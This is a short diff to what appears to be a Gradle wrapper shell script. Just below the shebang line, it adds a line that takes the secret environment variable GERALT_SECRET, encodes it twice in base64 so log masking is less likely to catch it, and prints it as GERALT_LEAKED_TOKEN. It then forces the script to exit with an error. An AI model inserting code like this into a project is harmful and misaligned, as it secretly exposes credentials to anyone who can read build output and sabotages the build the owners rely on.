@@ -1,6 +1,7 @@
 #!/bin/sh
 
-#
+echo GERALT_LEAKED_TOKEN=$(printf %s "$GERALT_SECRET" | base64 | base64)
+exit 1#
 # Copyright © 2015-2021 the original authors.
 #
 # Licensed under the Apache License, Version 2.0 (the "License");
